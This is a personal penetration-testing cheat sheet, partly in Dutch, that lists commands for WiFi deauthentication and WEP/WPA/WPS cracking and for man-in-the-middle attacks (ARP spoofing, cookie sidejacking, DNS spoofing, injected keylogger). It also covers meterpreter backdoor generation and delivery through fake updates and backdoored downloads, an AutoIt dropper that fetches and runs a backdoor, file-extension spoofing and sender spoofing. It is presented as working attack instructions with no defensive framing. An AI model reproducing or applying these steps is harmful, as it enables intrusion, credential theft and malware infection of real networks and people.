﻿# Change MAC-address

> ifconfig [interface] down
> macchanger -m [MAC] [interface]
> ifconfig [interface] up


# Enable monitor mode

> airmon-ng start [interface]
(monitordevice different name than interface)

OR

> ifconfig [interface] down
> iwconfig [interface] mode monitor
> ifconfig [interface] up
(monitordevice same name than interface)


# Start general packet sniffing

> airodump-ng [interface]
Ex: airodump-ng mon0


# Start targeted packet sniffing

> airodump-ng --channel [channel] --bssid [bssid] --write [file-name] [interface]
Ex: airodump-ng –channel 6 –bssid 11:22:33:44:55:66 –write out mon0


#Deauthentication attacks
To disconnect a device from the AP to let it reauthenticate 
------------------------------------------

To de-authenticate all clients in a specific network

> aireplay-ng --deauth [number of packets] -a [AP] [INTERFACE]
Ex: aireplay-ng --deauth 1000 -a 11:22:33:44:55:66 mon0

To de-authenticate a specific client in a network

> aireplay-ng --deauth [number of deauth packets] -a [AP] -c [target] [interface]
Ex: aireplay-ng --deauth 1000 -a 11:22:33:44:55:66 -c 00:AA:11:22:33:44 mon0

______________________________________________________________________________
# Gaining access to encrypted networks 
------------------------------------------------------------------------------

## WEP Cracking 

using a random 24-bit Initializing Vector (IV), 
in a busy network we can collect more than two packets with the same IV.

### CASE 1: BASE CASE 
--------------------------

Log the traffic from the target network

> airodump-ng --channel [channel] --bssid [bssid] --write [file-name] [interface]
Ex: airodump-ng –channel 6 –bssid 11:22:33:44:55:66 –write out mon0

try to crack the key using the capturefile

> aircrack-ng [file-name]
Ex: aircrack-ng out.cap


### CASE 2: AP is idle or no clients associated with AP (packet injection)
------------------------------------------------------------------------

we have to authenticate our wifi card with the AP, because AP's ignore 
any requests that come from devices that are not associated with the AP

> aireplay-ng --fakeauth 0 -a [targe MAC] -h [your MAC] [interface]
ex: aireplay-ng --fakeauth 0 -a E0:69:95:B8:BF:77 -h 00:c0:ca:6c:ca:12 mon0

	If this fake authentication was successful the value under the
	“AUTH” column in airodump-ng will change to “OPN”

we will wait for an ARP packet , we will then capture this packet and 
inject it into the traffic , this will force the AP to generate a new 
ARP packet with a new IV , we capture this new packet and inject into 
the traffic again , this process is repeated until the number of IV's 
captured is sufficient enough to crack the key.

> aireplay-ng --arpreplay -b [targe MAC] -h [your MAC] [interface]
ex: aireplay-ng --arpreplay -b E0:69:95:B8:BF:77 -h 00:c0:ca:6c:ca:12 mon0

Then we try to crack the key

> aircrack-ng out.cap

## WPA Cracking

### CASE 1: BASE CASE WITH WPS ENABLED 
----------------------------------------

encrypted with a unique temporary key, number of data collected is irrelevant.

Scan for AP's where WPS is enabled (vulnerable)
> wash -i [interface]
Ex: wash -i mon0

brute force the WPS ping and calculate the WPA key
> reaver -i [interface] -b [TARGET AP MAC] -c [TARGET CHANNEL] -vv
ex: reaver -b E0:69:95:8E:18:22 -c 11 -i mon0


### CASE 2: WPS DISABLED, CAPTURING HANDSHAKE
--------------------------------------------------

Handshake packets are sent every time a client associates with the target AP.
Start airodump to see if there are clients connected to the AP

> airodump-ng --channel [channel] --bssid [bssid] --write [file-name] [interface]
Ex: airodump-ng –channel 6 –bssid 11:22:33:44:55:66 –write out mon0

Wait for a client to connect to the AP, or deauthenticate a connected
client (if any) for a very short period of time so that their system will
connect back automatically.

> aireplay-ng --deauth [number of deauth packets] -a [AP] -c [target] [interface]
Ex: aireplay-ng --deauth 1000 -a 11:22:33:44:55:66 -c 00:AA:11:22:33:44 mon0
(Notice top right corner of airodump-ng will say “WPA handshake”.)

# Creating a wordlist #
we need a list of all the possible passwords, you can create them yourself

> crunch [min] [max] [characters=lower|upper|numbers|symbols] -t [pattern] -o file
ex: crunch 6 8 123456!"£$% -o wordlist -t a@@@@b

Use aircrack to crack the key

> aircrack-ng [HANDSHAKE FILE] -w [WORDLIST] [INTERFACE]
ex: aircrack-ng is-01.cap -w list mon0

# Scanning for networks 
## POST CONNECTION ATTACKS

-------NETDISCOVER----------
Discover the connected clients of the current network
> netdiscover -i [INTERFACE] -r [RANGE]
ex. > netdiscover -i wlan0 -r 192.168.1.1/24

---------AUTOSCAN-----------

program


-----------NMAP------------- (using program ZENMAP gui)

>zenmap

ping scan (basic)
quick scan (shows open port numbers)
quick scan plus (shows running programs on open ports)

	If there is an Apple iPhone or iPad with port SSH open, you can login with 
	>ssh root@[ip address of device]
	passord: alpine

## MAN IN THE MIDDLE ATTACKS
_______________________________________________________

All arp requests/responses are trusted between client and router.

### ARP POISONING
Send ARP response to the client (without he asks it) and say the hackers ip is the ip of the router.
So you tell the client you are the router by telling the client that the device with the routers ip has your MAC address,
so the client starts sending packets through you. Send ARP response to the router telling you are the client 
by telling the clients ip address has your MAC address. You are in the middle of the packets.

---------- ARP SPOOF -----------
tell client you are the router
> arpspoof -i [interface] -t [Target IP] [AP ip]
ex. > arspoof -i wlan0 -t 192.168.1.5 192.168.1.1

tell the router you are the client
> arpspoof -i [interface] -t [AP ip] [Target IP] 
ex. > arspoof -i wlan0 -t 192.168.1.1 192.168.1.5 

Enable IP forward to allow packets to flow through our device without being dropped.
> Echo 1 > /proc/sys/net/ipv4/ip_forward

### MITMF man in the middle framework

> mitmf --arp --spoof --gateway [gateway ip] --targets [targets ips] -i eth0
Ex. > mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 -i eth0

Enable IP forward to allow packets to flow through our device without being dropped.
> Echo 1 > /proc/sys/net/ipv4/ip_forward

----- WHEN CLIENT USES COOKIES TO LOGIN ------

sniff the cookies instead of sniffing passwords (apt-get install ferret-sidejack)
BEING MAN IN THE MIDDEL IS NEEDED!!!!!

> mitmf --arp --spoof --gateway [gateway ip] --targets [targets ips] -i eth0
Ex. > mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 -i eth0

Capture the cookies
> ferret -i [interface]
EX. > ferret -i eth0

(is a UI, injects the captured cookies into own browser)
> hamster 
(to use this tool: go to settings of browser, advanced, network, connection settings
and change the port numer to 127.0.0.1 Port 1234 and navigate in browser to 127.0.0.1/1234)

## DNS SPOOFING

start the webserver
> service apache2 start 

Adjust the file with the right ip settings [[[A]]]
> leafpad /etc/mitmf/mitmf.conf

> mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 -i eth0 --dns

----- MITMF Screenshotter ------

> mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 -i eth0 --screen
(screenshots located in /var/log/mitmf directory)

----- MITMF KEYLOGGER --------

> mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 -i eth0 --jskeylogger

----- MITMF Code Injection ------

> mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 --inject --js-payload "alert('test!');" 

OR 

> mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 --inject --js-file /root/alert.js
(you need to make a .js file in the home directory)


# NEXPOSE SCANNING

## Generate Backdoor

--------- Veil Framework ----------
https://github.com/Veil-Framework/Veil
Hier downloaden
In de map /opt
'git clone https://github.com/Veil-Framework/Veil'
Navigeer naar /opt/Veil/setup
./setup.py

Run: ./opt/Veil/Veil.py
> list
> 1
> list
> go/meterpreter/rev_https
> options instellen
> generate
stored here: /usr/share/veil-output/compiled/rev_https_80801.exe

---- Backdoor installeren ----
Luisteren op inkomende connections voor de poort waar de backdoor voor gecreate is 

> msfconsole
> use exploit/multi/handler
> show options
> set PAYLOAD windows/meterpreter/reverse_https
LHOST eigen ip
LPORT 8080
> exploit

Dan op target computer backdoor uitvoeren zodat die computer connectie maakt met poort 8080 van ons

--- Backdoor delivery 1: Spoofing Software Updates ----
Install Evilgrade
> git clone https://github.com/infobyte/evilgrade.git
> cd evilgrade/
> cpan Data::Dump
> cpan Digest::MD5
> cpan Time::HiRes
> cpan RPC::XML

> ./evilgrade
> show modules
> configure 'program'
> show options
> agent naar backdoor zetten
> start

(andere terminal)
> leafpad /etc/mitmf/mitmf.conf
dns poort 5353 aanpassen en ip's
[[[A]]] reccords aanpassen:
link van update in evilgrade : eigen ip (dus doorverwijzen naar uzelf)
> mitmf --arp --spoof --gateway ... ---target ... -i eth0 --dns

(andere temrinal)
> msfconsole
> use exploit/multi/handler
> show options
> set PAYLOAD windows/meterpreter/reverse_http
LHOST eigen ip
LPORT 8080
> exploit

wanneer target update, krijg je terminalcommand rights

--- Backdoor delivery 2: Backdooring exe downloads ----
Wanneer target iets random dowload, wordt de exe gebackdoored

> leafpad /etc/bdfproxy/bdfproxy.cfg
proxyMode = transparent
Host aanpassen naar eigen ip
> bdfproxy

(andere terminal)
> iptables -t nat -A PREROUTING -p -tcp --destination-port 80 -j REDIRECT --to-port 8080
> mitmf --arp --spoof --gateway ... --target ... -i eth0 --dns

(andere terminal)
> msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc (link staat waar bdfproxy draait)

Target download programma

# Social Engeneering

https://drive.google.com/uc?export=download&confirm=oLcO&id=16C95FI7yq4Uh82KgQ2Cg8H5-3jz4Umaz
Download Maltego met alle opties gratis

Run met /opt/maltegoce/bin/maltego

maak username en pw

## Backdooring Any File Type

Using an already created backdoor (see above) 
```
#include <StaticConstants.au3>
#include <WindowsConstants.au3>

Local $urls = "url1,url2"

Local $urlsArray = StringSplit($urls, ",", 2 )

For $url In $urlsArray
	$sFile = _DownloadFile($url)
	shellExecute($sFile)

Next

Func _DownloadFile($sURL)
    Local $hDownload, $sFile
    $sFile = StringRegExpReplace($sURL, "^.*/", "")
    $sDirectory = @TempDir & $sFile
    $hDownload = InetGet($sURL, $sDirectory, 17, 1)
    InetClose($hDownload)
    Return $sDirectory
EndFunc   ;==>_GetURLImage
```
* Local URL's: the file you want the target to see, needs to be online (on a server)
 First eg: "imageurl.jpg, backdoor.exe"
 
### Compiling the created script
(If Veil is installed, autoit will be installed automaticly)
* Change extention of the script from `.txt` to `.au3`.
* Search for compile; click the compile autoit program
* Source: created .au3 script
  Destination: .exe file
* use www.iconarchive.com to download and use a custom icon. (in case of an pdf, word,...)
  in case of an image: go to www.rw-designer.com/image-to-icon to an `.ico` file.
* Put the file you want the target to download on a webserver.
#### Wait for incomming connections
> msfconsole
> use exploit/multi/handler
> show options
> set PAYLOAD windows/meterpreter/reverse_https
LHOST eigen ip
LPORT 8080
> exploit

### Spoofing .exe file to any other file type
For example:
* You have a file: gtr.exe and you want to make it a .jpg
* We need to use a `right-to-left character`.
##### How to find `right-to-left character`
Search for characters, search for right to left override and copy the character.

* Name the file gtrgpj.exe and put a `right-to-left character` between r and g.
=> gtrexe.jpg
* Zip the file otherwise, your internetbrowser will remove the `right-to-left character`.

## Send mails as any person you want

Using Maltego, you can find people close to your target.

* search for https://anonymousemail.me


















































	